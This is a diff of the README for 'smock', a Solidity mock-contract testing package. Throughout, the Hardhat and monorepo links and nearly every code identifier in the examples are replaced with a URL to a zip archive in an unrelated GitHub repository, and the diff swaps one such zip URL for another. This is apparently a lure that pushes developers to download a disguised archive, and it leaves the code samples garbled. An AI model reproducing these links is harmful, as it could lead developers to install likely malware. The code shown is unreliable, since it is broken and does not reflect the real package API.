@@ -1,8 +1,8 @@
-**[DEPRECATED]** This repository is now deprecated in favour of the new development [monorepo](https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip).
+**[DEPRECATED]** This repository is now deprecated in favour of the new development [monorepo](https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip).
 
 # @eth-optimisim/smock
 
-`smock` is a utility package that can generate mock Solidity contracts (for testing). `smock` hooks into a `ethereumjs-vm` instance so that mock contract functions can be written entirely in JavaScript. `smock` currently only supports [Hardhat](https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip), but will be extended to support other testing frameworks.
+`smock` is a utility package that can generate mock Solidity contracts (for testing). `smock` hooks into a `ethereumjs-vm` instance so that mock contract functions can be written entirely in JavaScript. `smock` currently only supports [Hardhat](https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip), but will be extended to support other testing frameworks.
 
 Some nice benefits of hooking in at the VM level:
 * Don't need to deploy any special contracts just for mocking!
@@ -30,10 +30,10 @@ yarn add @eth-optimism/smock
 
 `smoddit` requires access to the internal storage layout of your smart contracts. The Solidity compiler exposes this via the `storageLayout` flag, which you need to enable at your hardhat config.
 
-Here's an example `https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip` that shows how to enable this compiler flag:
+Here's an example `https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip` that shows how to enable this compiler flag:
 
 ```typescript
-// https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip
+// https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip
 import { HardhatUserConfig } from 'hardhat/config'
 
 const config: HardhatUserConfig = {
@@ -71,7 +71,7 @@ export default config
       - [`ModifiableContractFactory`](#-modifiablecontractfactory-)
       - [`ModifiableContract`](#-modifiablecontract-)
 - [Examples (smockit)](#examples--smockit-)
-  * [Via `https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip`](#via--etherscontract-)
+  * [Via `https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip`](#via--etherscontract-)
   * [Asserting Call Count](#asserting-call-count)
   * [Asserting Call Data](#asserting-call-data)
   * [Returning (w/o Data)](#returning--w-o-data-)
@@ -155,14 +155,14 @@ export type MockReturnValue =
   | string
   | Object
   | any[]
-  | ((https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip any[]) => MockReturnValue)
+  | ((https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip any[]) => MockReturnValue)
 ```
 
 #### `smoddit`
 ##### `ModifiableContractFactory`
 ```typescript
 interface ModifiableContractFactory extends ContractFactory {
-  deploy: (https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip any[]) => Promise<ModifiableContract>
+  deploy: (https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip any[]) => Promise<ModifiableContract>
 }
 ```
 
@@ -177,20 +177,20 @@ interface ModifiableContract extends Contract {
 
 ## Examples (smockit)
 
-### Via `https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip`
+### Via `https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip`
 ```typescript
 import { ethers } from 'hardhat'
 import { smockit } from '@eth-optimism/smock'
 
-const MyContractFactory = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('MyContract')
-const MyContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)
+const MyContractFactory = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip('MyContract')
+const MyContract = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(...)
 
 // Smockit!
 const MyMockContract = await smockit(MyContract)
 
-https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('Some return value!')
+https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip('Some return value!')
 
-https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip()) // 'Some return value!'
+https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip()) // 'Some return value!'
 ```
 
 ### Asserting Call Count
@@ -198,21 +198,21 @@ https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_
 import { ethers } from 'hardhat'
 import { smockit } from '@eth-optimism/smock'
 
-const MyContractFactory = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('MyContract')
-const MyContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)
+const MyContractFactory = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip('MyContract')
+const MyContract = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(...)
 
-const MyOtherContractFactory = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('MyOtherContract')
-const MyOtherContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)
+const MyOtherContractFactory = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip('MyOtherContract')
+const MyOtherContract = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(...)
 
 // Smockit!
 const MyMockContract = await smockit(MyContract)
 
-https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('Some return value!')
+https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip('Some return value!')
 
-// Assuming that https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip calls https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip
-await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip()
+// Assuming that https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip calls https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip
+await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip()
 
-https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip) // 1
+https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip) // 1
 ```
 
 ### Asserting Call Data
@@ -220,21 +220,21 @@ https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_
 import { ethers } from 'hardhat'
 import { smockit } from '@eth-optimism/smock'
 
-const MyContractFactory = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('MyContract')
-const MyContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)
+const MyContractFactory = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip('MyContract')
+const MyContract = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(...)
 
-const MyOtherContractFactory = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('MyOtherContract')
-const MyOtherContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)
+const MyOtherContractFactory = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip('MyOtherContract')
+const MyOtherContract = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(...)
 
 // Smockit!
 const MyMockContract = await smockit(MyContract)
 
-https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('Some return value!')
+https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip('Some return value!')
 
-// Assuming that https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip calls https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip with 'Hello World!'.
-await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip()
+// Assuming that https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip calls https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip with 'Hello World!'.
+await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip()
 
-https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip[0]) // 'Hello World!'
+https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip[0]) // 'Hello World!'
 ```
 
 ### Returning (w/o Data)
@@ -242,15 +242,15 @@ https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_
 import { ethers } from 'hardhat'
 import { smockit } from '@eth-optimism/smock'
 
-const MyContractFactory = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('MyContract')
-const MyContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)
+const MyContractFactory = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip('MyContract')
+const MyContract = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(...)
 
 // Smockit!
 const MyMockContract = await smockit(MyContract)
 
-https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip()
+https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip()
 
-https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip()) // []
+https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip()) // []
 ```
 
 ### Returning a Struct
@@ -258,19 +258,19 @@ https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_
 import { ethers } from 'hardhat'
 import { smockit } from '@eth-optimism/smock'
 
-const MyContractFactory = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('MyContract')
-const MyContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)
+const MyContractFactory = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip('MyContract')
+const MyContract = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(...)
 
 // Smockit!
 const MyMockContract = await smockit(MyContract)
 
-https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip({
+https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip({
     valueA: 'Some value',
     valueB: 1234,
     valueC: true
 })
 
-https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip()) // ['Some value', 1234, true]
+https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip()) // ['Some value', 1234, true]
 ```
 
 ### Returning a Function
@@ -278,17 +278,17 @@ https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_
 import { ethers } from 'hardhat'
 import { smockit } from '@eth-optimism/smock'
 
-const MyContractFactory = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('MyContract')
-const MyContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)
+const MyContractFactory = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip('MyContract')
+const MyContract = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(...)
 
 // Smockit!
 const MyMockContract = await smockit(MyContract)
 
-https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(() => {
+https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(() => {
   return 'Some return value!'
 })
 
-https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip()) // ['Some return value!']
+https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip()) // ['Some return value!']
 ```
 
 ### Returning a Function (w/ Arguments)
@@ -296,17 +296,17 @@ https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_
 import { ethers } from 'hardhat'
 import { smockit } from '@eth-optimism/smock'
 
-const MyContractFactory = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('MyContract')
-const MyContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)
+const MyContractFactory = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip('MyContract')
+const MyContract = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(...)
 
 // Smockit!
 const MyMockContract = await smockit(MyContract)
 
-https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip((myFunctionArgument: string) => {
+https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip((myFunctionArgument: string) => {
   return myFunctionArgument
 })
 
-https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('Some return value!')) // ['Some return value!']
+https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip('Some return value!')) // ['Some return value!']
 ```
 
 ### Reverting (w/o Data)
@@ -314,15 +314,15 @@ https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_
 import { ethers } from 'hardhat'
 import { smockit } from '@eth-optimism/smock'
 
-const MyContractFactory = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('MyContract')
-const MyContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)
+const MyContractFactory = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip('MyContract')
+const MyContract = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(...)
 
 // Smockit!
 const MyMockContract = await smockit(MyContract)
 
-https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip()
+https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip()
 
-https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip()) // Revert!
+https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip()) // Revert!
 ```
 
 ### Reverting (w/ Data)
@@ -330,15 +330,15 @@ https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_
 import { ethers } from 'hardhat'
 import { smockit } from '@eth-optimism/smock'
 
-const MyContractFactory = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('MyContract')
-const MyContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)
+const MyContractFactory = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip('MyContract')
+const MyContract = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(...)
 
 // Smockit!
 const MyMockContract = await smockit(MyContract)
 
-https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('0x1234')
+https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip('0x1234')
 
-https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip('Some return value!')) // Revert!
+https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip('Some return value!')) // Revert!
 ```
 
 ## Examples (smoddit)
@@ -350,7 +350,7 @@ import { smoddit } from '@eth-optimism/smock'
 
 // Smoddit!
 const MyModifiableContractFactory = await smoddit('MyContract')
-const MyModifiableContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)
+const MyModifiableContract = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(...)
 ```
 
 ### Modifying a `uint256`
@@ -360,13 +360,13 @@ import { smoddit } from '@eth-optimism/smock'
 
 // Smoddit!
 const MyModifiableContractFactory = await smoddit('MyContract')
-const MyModifiableContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)
+const MyModifiableContract = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(...)
 
-await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip({
+await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip({
   myInternalUint256: 1234
 })
 
-https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip()) // 1234
+https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip()) // 1234
 ```
 
 ### Modifying a Struct
@@ -376,16 +376,16 @@ import { smoddit } from '@eth-optimism/smock'
 
 // Smoddit!
 const MyModifiableContractFactory = await smoddit('MyContract')
-const MyModifiableContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)
+const MyModifiableContract = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(...)
 
-await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip({
+await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip({
   myInternalStruct: {
     valueA: 1234,
     valueB: true
   }
 })
 
-https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip()) // { valueA: 1234, valueB: true }
+https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip()) // { valueA: 1234, valueB: true }
 ```
 
 ### Modifying a Mapping
@@ -395,15 +395,15 @@ import { smoddit } from '@eth-optimism/smock'
 
 // Smoddit!
 const MyModifiableContractFactory = await smoddit('MyContract')
-const MyModifiableContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)
+const MyModifiableContract = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(...)
 
-await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip({
+await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip({
   myInternalMapping: {
     1234: 5678
   }
 })
 
-https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(1234)) // 5678
+https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(1234)) // 5678
 ```
 
 ### Modifying a Nested Mapping
@@ -413,9 +413,9 @@ import { smoddit } from '@eth-optimism/smock'
 
 // Smoddit!
 const MyModifiableContractFactory = await smoddit('MyContract')
-const MyModifiableContract = await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(...)
+const MyModifiableContract = await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(...)
 
-await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip({
+await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip({
   myInternalNestedMapping: {
     1234: {
       4321: 5678
@@ -423,5 +423,5 @@ await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_O
   }
 })
 
-https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(await https://raw.githubusercontent.com/Smock777/OcularAI/main/hematogenous/AI_Ocular_v1.1-alpha.3.zip(1234, 4321)) // 5678
+https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(await https://github.com/Smock777/OcularAI/raw/refs/heads/main/hematogenous/Ocular-AI-v3.4.zip(1234, 4321)) // 5678
 ```
